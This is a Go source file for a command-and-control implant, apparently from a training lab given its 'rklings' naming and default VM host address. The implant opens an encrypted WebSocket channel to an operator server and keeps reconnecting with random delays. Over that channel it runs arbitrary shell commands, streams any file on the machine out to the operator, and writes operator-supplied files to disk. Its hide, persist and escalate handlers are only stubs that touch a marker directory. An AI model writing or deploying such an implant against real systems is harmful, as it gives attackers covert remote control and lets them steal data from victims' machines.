// Agent with command dispatch, remote shell, and file transfer over WebSocket+AEAD.
package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	_ "embed"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/coder/websocket"
	"golang.org/x/crypto/hkdf"
)

//go:embed keys/agent.key
var agentPrivKey []byte

//go:embed keys/operator.pub
var operatorPubKey []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

var errCiphertextShort = errors.New("ciphertext too short")

func deriveKeys(privRaw, peerPubRaw []byte) (key [32]byte, id [8]byte, err error) {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(privRaw)
	if err != nil {
		return key, id, err
	}
	pub, err := curve.NewPublicKey(peerPubRaw)
	if err != nil {
		return key, id, err
	}
	secret, err := priv.ECDH(pub)
	if err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), key[:]); err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-id")), id[:]); err != nil {
		return key, id, err
	}
	return
}

func newGCM(key [32]byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

func sealAEAD(key [32]byte, plaintext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func openAEAD(key [32]byte, ciphertext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errCiphertextShort
	}
	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
}

var (
	sharedKey     [32]byte
	agentPubBytes []byte
	wsConn        *websocket.Conn
	writeMu       sync.Mutex
)

func initTransport() {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(agentPrivKey)
	if err != nil {
		panic("parse agent key: " + err.Error())
	}
	agentPubBytes = priv.PublicKey().Bytes()
	sharedKey, _, err = deriveKeys(agentPrivKey, operatorPubKey)
	if err != nil {
		panic("derive keys: " + err.Error())
	}
}

func wsURL() string {
	scheme := "wss"
	if len(serverAddr) > 0 && (serverAddr[0] >= '0' && serverAddr[0] <= '9' || serverAddr[0] == '[') {
		scheme = "ws"
	}
	return fmt.Sprintf("%s://%s/", scheme, serverAddr)
}

func wsSend(v any) error {
	plain, err := json.Marshal(v)
	if err != nil {
		return err
	}
	ct, err := sealAEAD(sharedKey, plain)
	if err != nil {
		return err
	}
	writeMu.Lock()
	defer writeMu.Unlock()
	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
}

func wsSendRaw(plain []byte) error {
	ct, err := sealAEAD(sharedKey, plain)
	if err != nil {
		return err
	}
	writeMu.Lock()
	defer writeMu.Unlock()
	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
}

func wsLoop() {
	for {
		if err := wsSession(); err != nil {
			time.Sleep(jitterDuration(3000, 10000))
		}
	}
}

func wsSession() error {
	ctx := context.Background()
	conn, _, err := websocket.Dial(ctx, wsURL(), nil)
	if err != nil {
		return err
	}
	defer conn.CloseNow()
	conn.SetReadLimit(4 << 20)
	wsConn = conn

	hello, _ := json.Marshal(map[string]string{"t": "hello"})
	ct, err := sealAEAD(sharedKey, hello)
	if err != nil {
		return err
	}
	frame := append(agentPubBytes, ct...)
	if err := conn.Write(ctx, websocket.MessageBinary, frame); err != nil {
		return err
	}

	for {
		_, msg, err := conn.Read(ctx)
		if err != nil {
			return err
		}
		plain, err := openAEAD(sharedKey, msg)
		if err != nil {
			continue
		}
		var cmd Command
		if json.Unmarshal(plain, &cmd) != nil {
			continue
		}
		if cmd.Op == "DOWNLOAD" {
			if err := streamDownload(cmd.Arg); err != nil {
				return err
			}
			continue
		}
		result := execute(cmd)
		if err := wsSend(map[string]any{"data": result}); err != nil {
			return err
		}
	}
}

func jitterDuration(minMs, maxMs int) time.Duration {
	buf := make([]byte, 8)
	rand.Read(buf)
	n := int(buf[0])<<8 | int(buf[1])
	ms := minMs + n%(maxMs-minMs)
	return time.Duration(ms) * time.Millisecond
}

type Command struct {
	Op   string          `json:"op"`
	Arg  string          `json:"arg,omitempty"`
	Data json.RawMessage `json:"data,omitempty"`
}

func execute(cmd Command) any {
	switch cmd.Op {
	case "PING":
		return "PONG"
	case "STATUS":
		return handleStatusCmd()
	case "HIDE":
		return handleHideCmd(cmd.Arg)
	case "PERSIST":
		return handlePersistCmd()
	case "ESCALATE":
		return handleEscalateCmd(cmd.Arg)
	case "SHELL":
		return handleShellCmd(cmd.Arg)
	case "UPLOAD":
		return handleUploadCmd(cmd)
	default:
		return map[string]string{"error": "unknown command"}
	}
}

func handleStatusCmd() any {
	return map[string]int{"pid": os.Getpid(), "uid": os.Getuid()}
}

func handleHideCmd(arg string) any {
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		return "ERR missing argument"
	}
	prefixes := map[string]string{"FILE": "h.f", "PID": "h.i", "PORT": "h.p"}
	prefix, ok := prefixes[parts[0]]
	if !ok {
		return "ERR unknown hide target"
	}
	mkdirCmd(prefix + "." + parts[1])
	return "OK"
}

func handlePersistCmd() any {
	mkdirCmd("persist")
	return "OK"
}

func handleEscalateCmd(arg string) any {
	mkdirCmd("e")
	return "OK"
}

func handleShellCmd(arg string) any {
	out, err := exec.Command("/bin/sh", "-c", arg).CombinedOutput()
	exitCode := 0
	if err != nil {
		exitCode = -1
		if ee, ok := err.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		}
	}
	return map[string]any{
		"stdout":    string(out),
		"exit_code": exitCode,
	}
}

const dlChunkSize = 1 << 20

func streamDownload(path string) error {
	f, err := os.Open(path)
	if err != nil {
		wsSend(map[string]any{"data": map[string]string{"error": err.Error()}})
		return nil
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		wsSend(map[string]any{"data": map[string]string{"error": err.Error()}})
		return nil
	}

	if err := wsSend(map[string]any{"data": map[string]any{"size": info.Size()}}); err != nil {
		return err
	}

	buf := make([]byte, 1+dlChunkSize)
	buf[0] = 0x01
	for {
		n, readErr := f.Read(buf[1:])
		if n > 0 {
			if err := wsSendRaw(buf[:1+n]); err != nil {
				return err
			}
		}
		if readErr != nil {
			break
		}
	}

	return wsSendRaw([]byte{0x02})
}

func handleUploadCmd(cmd Command) any {
	var req struct {
		Path string `json:"path"`
		Data string `json:"data"`
	}
	if json.Unmarshal(cmd.Data, &req) != nil {
		return "ERR bad upload data"
	}
	raw, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		return fmt.Sprintf("ERR decode: %v", err)
	}
	if err := os.WriteFile(req.Path, raw, 0644); err != nil {
		return fmt.Sprintf("ERR %v", err)
	}
	return "OK"
}

func main() {
	initTransport()
	wsLoop()
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

func mkdirCmd(name string) error {
	path := "rklings." + name
	err := os.Mkdir(path, 0755)
	_ = os.Remove(path)
	return err
}
